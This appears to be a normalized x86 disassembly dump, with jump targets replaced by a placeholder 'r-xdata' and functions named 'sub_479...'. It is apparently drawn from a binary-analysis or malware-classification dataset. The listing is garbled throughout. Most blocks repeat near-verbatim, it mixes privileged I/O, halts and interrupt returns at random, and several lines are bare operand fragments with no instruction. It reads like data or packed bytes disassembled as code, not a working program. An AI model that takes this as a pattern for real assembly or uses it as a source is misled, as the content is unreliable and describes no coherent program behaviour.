jpo r-xdata
sbb [ ebx + edi * 2 + 0x7b ] edx
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
lahf
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
jpo r-xdata
sub eax 0x63b29236
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
jpo r-xdata
jpo r-xdata
mov edi 0xf6af3ef3
lahf
jmp r-xdata
lahf
sub_479a8a
push cs
ja r-xdata
jmp r-xdata
fcom [ esi + 0x7b ]
jpo r-xdata
xchg edx eax
and eax 0xeb848487
jmp r-xdata
test [ edx + edx * 4 - 0x7b7b782f ] al
jmp r-xdata
xchg ebx eax
cmp [ ebx + 0x7b ] 0xa32d927b
test [ ebx + ebp * 8 + 0x5406932b ] al
jpo r-xdata
xchg ebx eax
hlt
test [ edx + edx * 4 + 0x7b7b5d4c ] al
jmp r-xdata
and ecx [ es : eax - 0x60 ]
xchg edx eax
pop es
jg r-xdata
jmp r-xdata
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
mov al [ 0x2126f21d ]
xchg edx eax
jpo r-xdata
jge r-xdata
lahf
jmp r-xdata
sbb eax 0x922126f2
and ecx [ eax - 0x60 ]
jmp r-xdata
jmp r-xdata
mov ebx 0x84a45592
test bl ch
dec eax
mov ebx 0xebebebb8
jmp r-xdata
test [ edx + 0x7b7b71f8 ] dl
jmp r-xdata
jpo r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
jmp r-xdata
pop edx
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
xchg edx eax
pop ds
push eax
jpo r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
clc
mov edi 0x79112877
test [ 0x7dc99277 ] ch
jpo r-xdata
sbb [ ebx + edi * 2 + 0x7b ] edx
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
sub eax 0x63b29236
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
jpo r-xdata
jpo r-xdata
mov edi 0xf6af3ef3
lahf
jmp r-xdata
lahf
sub_479ad0
jmp r-xdata
jpo r-xdata
jmp r-xdata
mov edi 0x79112877
test [ 0x7dc99277 ] ch
jpo r-xdata
jmp r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
sbb [ ebx + edi * 2 + 0x7b ] edx
clc
jmp r-xdata
jns r-xdata
outsd
pop edx
jmp r-xdata
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
jmp r-xdata
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
lahf
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
lahf
jpo r-xdata
sub eax 0x63b29236
sub_479ad6
adc [ edx - 0x7b7b745a ] 0xffffffeb
jmp r-xdata
jpo r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
sbb [ ebx + edi * 2 + 0x7b ] edx
clc
mov edi 0x79112877
test [ 0x7dc99277 ] ch
jmp r-xdata
jns r-xdata
outsd
pop edx
jmp r-xdata
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
jmp r-xdata
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
lahf
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
lahf
jpo r-xdata
sub eax 0x63b29236
sub_479ae7
xchg edx eax
stosd [ edi ]
push ecx
jpo r-xdata
movsd [ edi ] [ esi ]
xchg edx eax
leave
add [ esp + eax * 4 + 0x112c2c2b ] 0x5b
sub al 0x2c
sub al 0x2c
idiv bh
pop edi
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
push esp
jpo r-xdata
pop edx
clc
mov edi 0x79112877
test [ 0x7dc99277 ] ch
jpo r-xdata
jmp r-xdata
xchg edx eax
pop ds
push eax
jpo r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
sbb [ ebx + edi * 2 + 0x7b ] edx
lahf
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
jpo r-xdata
sub eax 0x63b29236
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
jpo r-xdata
jpo r-xdata
mov edi 0xf6af3ef3
lahf
jmp r-xdata
lahf
sub_479aef
jmp r-xdata
jmp r-xdata
jge r-xdata
test [ edx + 0x7b7b71f8 ] dl
jmp r-xdata
jpo r-xdata
pop edx
sub edx [ ebx + 0x7b7b5419 ]
jmp r-xdata
jmp r-xdata
xchg edx eax
pop ds
push eax
jpo r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
clc
mov edi 0x79112877
test [ 0x7dc99277 ] ch
jpo r-xdata
sbb [ ebx + edi * 2 + 0x7b ] edx
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
lahf
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
jpo r-xdata
sub eax 0x63b29236
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
jpo r-xdata
jpo r-xdata
mov edi 0xf6af3ef3
lahf
jmp r-xdata
lahf
sub_479af0
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
sbb [ ebx + edi * 2 + 0x7b ] edx
clc
mov edi 0x79112877
test [ 0x7dc99277 ] ch
jmp r-xdata
jns r-xdata
outsd
pop edx
jmp r-xdata
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
jmp r-xdata
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
lahf
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

mov edi 0xf6af3ef3
lahf
jmp r-xdata
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
lahf
jpo r-xdata
sub eax 0x63b29236
sub_479b00
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
push esp
jpo r-xdata
pop edx
clc
mov edi 0x79112877
test [ 0x7dc99277 ] ch
jpo r-xdata
jmp r-xdata
xchg edx eax
pop ds
push eax
jpo r-xdata
xchg edx eax
clc
jno r-xdata
jmp r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

idiv [ esi ]
imul ebp [ ebx ] 0x13
jge r-xdata
jpo r-xdata
xchg ebx eax
sbb [ ebx + edi * 2 + 0x7b ] edx
lahf
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jmp r-xdata
jns r-xdata
outsd
jmp r-xdata
jpo r-xdata
sub eax 0x63b29236
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
jpo r-xdata
jpo r-xdata
mov edi 0xf6af3ef3
lahf
jmp r-xdata
lahf
sub_479b15
[ ss : edx - 0x7b7b70c4 ] edx
sbb eax 0x482326f2
mov al [ 0x2126f21d ]
xchg edx eax
xor [ ss : 0x63b29236 ] ch
jpo r-xdata
lahf
mov edi 0xf6af3ef3
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jmp r-xdata
mov dl 0xa0
test [ ebx + ebp * 8 + 0x6e92ebeb ] al
jge r-xdata
and ecx [ eax - 0x60 ]
sbb eax 0x922126f2
jmp r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
mov esp 0x3036973e
sub eax 0x63b29236
sub_479b44
xchg [ esp + eax * 4 + 0x7b71f892 ] al
jpo r-xdata
outsd
pop edx
jmp r-xdata
jmp r-xdata
xchg edx eax
pop ds
push eax
jpo r-xdata
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
xor [ 0x63b29236 ] ch
adc [ ebx - 0x6e ] edi
in al dx
push edx
jpo r-xdata
div dh

lahf
mov edi 0xf6af3ef3
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jpo r-xdata
sub eax 0x63b29236
sub_479b53
jmp r-xdata
jno r-xdata
xlat
jpo r-xdata
jpo r-xdata
je r-xdata
jpo r-xdata
jpo r-xdata
jmp r-xdata
call edx
dec ebx
jpo r-xdata
ror [ ebx + 0x7b ] cl
jpo r-xdata
xchg edi eax
xor [ ss : 0x63b29236 ] ch
jne r-xdata
xchg edx eax
jmp r-xdata
jmp r-xdata
xchg ebx eax
jmp r-xdata
sbb esp [ ecx - 0x1147b7c ]
lahf
mov edi 0xf6af3ef3
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jmp r-xdata
xchg edx eax
mov dl 0x92
int 0x9a
test [ ebx + ebp * 8 - 0x516c4310 ] al
and ah [ edx ]
xchg edx eax
push esp
push eax
jpo r-xdata
mov [ esi + edi * 8 - 0x10 ] dh
push ebp
jpo r-xdata
jns r-xdata
and ch [ ecx ]
sbb eax 0xf09136f2
xchg ebx eax
xchg edx eax
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
mov dl 0xb8
jmp r-xdata
pop ebx
jpo r-xdata
jmp r-xdata
sub [ esi + ebp * 2 + 0x7b7b7bd7 ] al
jmp sub_479be5
jpo r-xdata
cmpsd [ esi ] [ edi ]
xchg edx eax
arpl [ ebp + 0x7b ] si
jpo r-xdata
mov bl 0x1d
xchg edi eax
and dl [ edx + 0x7b7b524e ]
jmp r-xdata
dec eax
mov ebx 0xb2202524
mov eax 0xebebebeb
sbb eax 0x229336f2
sub [ 0xfffffffff09136f2 ] ebx
int1
outsd
inc ecx
xchg ebx eax
lds ebx [ eax - 0x9d47b7c ]
test [ ebx ] ch
idiv dh
scasd [ edi ]
xchg [ esp + eax * 4 - 0x60f36dd5 ] al
lodsb [ esi ]
test [ edx + 0x7b7a2892 ] al
jpo r-xdata
xchg ebx eax
scasb [ edi ]
xor [ 0x63b29236 ] ch
sub eax 0x36973ebc
test [ 0x6b48922b ] ch
jpo r-xdata
add dh [ ecx + 0x7b ]
jpo r-xdata
je r-xdata
jle r-xdata
jmp r-xdata
jmp r-xdata
jpe r-xdata
jmp r-xdata
jmp r-xdata
push 0xffffff85
jpo r-xdata
jpo r-xdata
xchg edx eax
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0xde2f7ef ] al
cdq
and edx [ ecx ]
pop ecx
xchg edx eax
out 0x62 al
jpo r-xdata
or al 0x9f
dec eax
mov ebx 0x7b7c9c92
jpo r-xdata
sub al 0x2c
sub al 0xf6
[ edi - 0x39 ]
test bl ch
js r-xdata
js r-xdata
mov ch 0x55
jpo r-xdata
jo r-xdata
and al 0x25
mov eax 0xa792ebeb
mov ah 0x71
jpo r-xdata
jpo r-xdata
sub eax 0xf8a3f043
add [ esp + esi * 2 + 0x7b6969fe ] 0x7b
sub al 0x4a
jpo r-xdata
dec eax
lea ebp [ 0xffffffff92372c84 ]
dec ecx
cdq
jmp r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub ebp [ edx + esi * 8 ]
jmp r-xdata
clc
mov ebx 0xb4922b73
jno r-xdata
xchg edi eax
dec ebx
adc [ ecx ] ebx
xchg edx eax
lds ebx [ ebx - 0x14147b7c ]
sbb eax 0xff748dfe
cmc
jne r-xdata
jmp r-xdata
dec ebx
imul edi [ ebx ] 0x35
jmp r-xdata
push [ ebp - 0x6d848497 ]
mov ch 0x69
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
je r-xdata
jpo r-xdata
jmp r-xdata
push eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
clc
jpo r-xdata
pop eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
cmp esi [ 0x747efe74 ]
imul ebp [ ecx + 0x7b ] 0x92bb487b
pushfd
jl r-xdata
mov ecx 0xeb7b7b7a
xchg edx eax
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
jpo r-xdata
r-xdata
test ah cl
mov edi 0x937b7b7b
0x7b61
jpo r-xdata
clc
pop ds
pop edi
pop edi
jpo r-xdata
jg r-xdata
int3
jpo r-xdata
jpo r-xdata
jmp r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
[ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
jmp r-xdata
iretd
aas
pop edi
pop edi
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
je r-xdata
test [ esp + eax * 4 - 0x7b7ac56e ] eax
test bl ch
jmp r-xdata
je r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
xchg ecx eax
push esp
jpo r-xdata
jg r-xdata
jpo r-xdata
pop edi
pop ebx
xchg edx eax
ja r-xdata
jpo r-xdata
jmp r-xdata
pop ebp
pop esi
jpo r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xor edx 0x2e
xchg edx esi
std
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
jpo r-xdata
imul [ esi ]
pushad
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
js r-xdata
sbb eax 0x1d793cf0
lahf
cmp esi [ ebx - 0x6e ]
jmp r-xdata
adc [ 0xfffffffff21db3f0 ] edx
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
adc eax 0xf21db3f0
je r-xdata
jpo r-xdata
push ebx
sub_479b8f
jmp r-xdata
jpo r-xdata
jmp sub_479c6f
sub eax [ ebp + ebp + 0x6b48922b ]
jpe r-xdata
jmp r-xdata
dec eax
mov ebx 0x7b7c9c92
jpo r-xdata
sub al 0x2c
sub al 0xf6
[ edi - 0x39 ]
jns r-xdata
sub eax 0xf8a3f043
add [ esp + esi * 2 + 0x7b6969fe ] 0x7b
dec eax
lea ebp [ 0xffffffff92372c84 ]
sub al 0x4a
jpo r-xdata
dec ecx
cdq
jmp r-xdata
jmp sub_479be5
jpo r-xdata
mov dl 0xb8
jmp r-xdata
push [ ebp - 0x6d848497 ]
mov ch 0x69
jpo r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
je r-xdata
sub eax 0x36973ebc
jpo r-xdata
test [ 0x6b48922b ] ch
cmpsd [ esi ] [ edi ]
xchg edx eax
arpl [ ebp + 0x7b ] si
jpo r-xdata
dec eax
mov ebx 0xb2202524
mov eax 0xebebebeb
sbb eax 0x229336f2
sub [ 0xfffffffff09136f2 ] ebx
imul ebp [ ecx + 0x7b ] 0x92bb487b
pushfd
jl r-xdata
mov ecx 0xeb7b7b7a
xchg edx eax
lahf
mov edi 0xf6af3ef3
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
jmp r-xdata
add dh [ ecx + 0x7b ]
jpo r-xdata
mov bl 0x1d
xchg edi eax
and dl [ edx + 0x7b7b524e ]
jmp r-xdata
xchg ebx eax
and ch [ ecx ]
sbb eax 0xf09136f2
jpo r-xdata
jpo r-xdata
xor [ 0x63b29236 ] ch
jpo r-xdata
mov esp 0x362d933e
xor [ 0x36973ebc ] ch
jmp r-xdata
push 0xffffff85
test [ esp + eax * 4 - 0x7b7ac56e ] eax
test bl ch
jmp r-xdata
je r-xdata
test bl ch
jmp r-xdata
pop ebp
pop esi
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jpo r-xdata
lahf
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
xchg edx eax
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0xde2f7ef ] al
cdq
and edx [ ecx ]
pop ecx
xchg edx eax
out 0x62 al
jpo r-xdata
or al 0x9f
jmp r-xdata
mov ah 0x71
jpo r-xdata
jpo r-xdata
xchg edi eax
dec ebx
adc [ ecx ] ebx
xchg edx eax
lds ebx [ ebx - 0x14147b7c ]
sbb eax 0xff748dfe
cmc
jne r-xdata
jmp r-xdata
dec ebx
imul edi [ ebx ] 0x35
jmp r-xdata
pop eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
je r-xdata
jle r-xdata
cmp esi [ 0x747efe74 ]
jpo r-xdata
clc
pop ds
pop edi
pop edi
jpo r-xdata
jg r-xdata
int3
jpo r-xdata
jpo r-xdata
mov ch 0x55
jpo r-xdata
jo r-xdata
and al 0x25
mov eax 0xa792ebeb
[ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
jmp r-xdata
iretd
aas
pop edi
pop edi
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
je r-xdata
js r-xdata
js r-xdata
jmp r-xdata
clc
mov ebx 0xb4922b73
jno r-xdata
jpo r-xdata
pop edi
pop ebx
xchg edx eax
ja r-xdata
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub ebp [ edx + esi * 8 ]
jpo r-xdata
clc
jpo r-xdata
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xor edx 0x2e
xchg edx esi
std
push eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
r-xdata
test ah cl
mov edi 0x937b7b7b
0x7b61
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
js r-xdata
sbb eax 0x1d793cf0
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
xchg ecx eax
push esp
jpo r-xdata
jg r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jpo r-xdata
imul [ esi ]
pushad
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
adc [ 0xfffffffff21db3f0 ] edx
cmp esi [ ebx - 0x6e ]
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
jmp r-xdata
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
adc eax 0xf21db3f0
je r-xdata
jpo r-xdata
push ebx
sub_479bd2
xchg edi eax
xchg [ esp + eax * 4 + 0x5e4f922b ] al
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
sub edx [ ebx ]
jge r-xdata
lahf
jmp r-xdata
jmp r-xdata
jns r-xdata
mov edi 0xf6af3ef3
lahf
lahf
xchg ebx eax
idiv [ esi ]
rcl [ edx + 0x7b7b7317 ] cl
jmp r-xdata
mov edi 0xf6af3ef3
jmp r-xdata
sub dh dh
sub_479bde
push eax
mov esp 0x679afe74
jpo r-xdata
xchg edx eax
cwde
outsd
jpo r-xdata
push eax
mov dl [ edx + 0x7b7b618e ]
and bh dh
mov ebx 0x84994992
test bl ch
jmp r-xdata
add [ esp + eax * 4 - 0x7b65656e ] 0xebebeb84
jmp r-xdata
jmp r-xdata
jpo r-xdata
clc
mov edi 0x74bbfe77
push edx
je r-xdata
imul ebp [ ecx + 0x7b ] 0x92bb487b
pushfd
jl r-xdata
jpo r-xdata
jpo r-xdata
test [ esp + eax * 4 - 0x7b7ac56e ] eax
test bl ch
jmp r-xdata
je r-xdata
sub eax 0xf8a3f043
add [ esp + esi * 2 + 0x7b6969fe ] 0x7b
dec eax
mov ebx 0x7b7c9c92
dec eax
lea ebp [ 0xffffffff92372c84 ]
sub al 0x4a
jpo r-xdata
jmp r-xdata
pop ebp
pop esi
jpo r-xdata
mov dl 0xb8
jmp r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
dec eax
mov ebx 0xb2202524
mov eax 0xebebebeb
sbb eax 0x229336f2
sub [ 0xfffffffff09136f2 ] ebx
cmpsd [ esi ] [ edi ]
xchg edx eax
arpl [ ebp + 0x7b ] si
jpo r-xdata
lahf
add dh [ ecx + 0x7b ]
jpo r-xdata
mov bl 0x1d
xchg edi eax
and dl [ edx + 0x7b7b524e ]
jmp r-xdata
xchg ebx eax
and ch [ ecx ]
sbb eax 0xf09136f2
jmp r-xdata
jmp r-xdata
jmp r-xdata
push 0xffffff85
xchg edx eax
cmpsd [ esi ] [ edi ]
test [ ebx + ebp * 8 - 0xde2f7ef ] al
cdq
and edx [ ecx ]
pop ecx
xchg edx eax
out 0x62 al
jpo r-xdata
or al 0x9f
test bl ch
mov ah 0x71
jpo r-xdata
jpo r-xdata
mov dl 0xb8
jmp r-xdata
xchg edi eax
dec ebx
adc [ ecx ] ebx
xchg edx eax
lds ebx [ ebx - 0x14147b7c ]
sbb eax 0xff748dfe
cmc
jne r-xdata
jmp r-xdata
dec ebx
imul edi [ ebx ] 0x35
jmp r-xdata
jpo r-xdata
pop eax
jpo r-xdata
jpo r-xdata
jmp r-xdata
je r-xdata
jle r-xdata
cmp esi [ 0x747efe74 ]
test [ edx + edx * 4 - 0x7b7b7ac6 ] al
jmp r-xdata
jmp r-xdata
jpo r-xdata
clc
pop ds
pop edi
pop edi
jpo r-xdata
jg r-xdata
int3
jpo r-xdata
jpo r-xdata
mov ch 0x55
jpo r-xdata
jo r-xdata
and al 0x25
mov eax 0xa792ebeb
xchg edx eax
cmp al [ ebp - 0x14147b7c ]
jmp r-xdata
[ 0xfffffffff0b906f2 ] 0x85
xchg edx eax
retn
jmp r-xdata
iretd
aas
pop edi
pop edi
sub esi [ esp + ecx * 8 + 0x7c ]
sub ebx [ 0x1d793cf0 ]
je r-xdata
js r-xdata
js r-xdata
jmp r-xdata
clc
mov ebx 0xb4922b73
jno r-xdata
jmp r-xdata
jpo r-xdata
pop edi
pop ebx
xchg edx eax
ja r-xdata
jpo r-xdata
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
sub ebp [ edx + esi * 8 ]
jpo r-xdata
clc
jpo r-xdata
xchg [ esp + eax * 4 - 0x6d94d37c ] al
lds ebx [ edx - 0x14147b7c ]
jmp r-xdata
cmp esi [ ecx + ebx * 8 - 0xe ]
xchg edx esi
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
xor edx 0x2e
xchg edx esi
std
push eax
jpo r-xdata
jmp r-xdata
jpo r-xdata
jpo r-xdata
r-xdata
test ah cl
mov edi 0x937b7b7b
0x7b61
test [ ebx ] ch
sub dl dh
into
stosd [ edi ]
js r-xdata
sbb eax 0x1d793cf0
jmp r-xdata
jmp r-xdata
xchg edx eax
xchg edi eax
xchg ebx eax
xchg edi eax
jge r-xdata
mov edi 0x74bbfe77
test [ eax + 0x7b ] ah
jpo r-xdata
jg r-xdata
add edx [ edx + 0x7b7b7e11 ]
jmp r-xdata
dec eax
mov ebx 0x63d6923b
jpo r-xdata
jmp r-xdata
xchg ecx eax
push esp
jpo r-xdata
jg r-xdata
xchg edx eax
pop esp
jpo r-xdata
jmp r-xdata
jae r-xdata
jpo r-xdata
jmp r-xdata
jmp r-xdata
jpo r-xdata
adc [ ebx ] eax
xchg edx eax
adc [ esi + 0x7b ] edi
jpo r-xdata
jmp r-xdata
mov bh al
mov edx 0x723c9279
jpo r-xdata
jpo r-xdata
pop esp
cmp eax 0xeb84848e
jpo r-xdata
imul [ esi ]
pushad
jpe r-xdata
xchg edx eax
jle r-xdata
jmp r-xdata
jmp r-xdata
jmp r-xdata
mov ebx 0x5cf3ff74
pop esp
jmp r-xdata
adc [ 0xfffffffff21db3f0 ] edx
cmp esi [ ebx - 0x6e ]
test bl ch
jmp r-xdata
test [ ebx + ebp * 8 + 0x3ef66b11 ] al
stosd [ edi ]
sub eax 0x7b61d292
jmp r-xdata
jmp r-xdata
mov es [ esp + eax * 4 - 0x40071415 ]
inc ebx
xchg edx eax
xchg esi eax
test [ ebx + ebp * 8 - 0x14141415 ] al
jmp r-xdata
jmp r-xdata
mov esp [ ss : edx ]
adc [ edi ] ecx
xchg edx eax
int3
adc eax 0xf21db3f0
je r-xdata
jpo r-xdata
push ebx
sub_479be5
jpo r-xdata
[ edi ]
div [ esi ]
xchg ebx eax
mov dl [ edx + 0x7b7b618e ]
and bh dh
mov ebx 0x84994992
test bl ch
jmp r-xdata
idiv [ esi ]
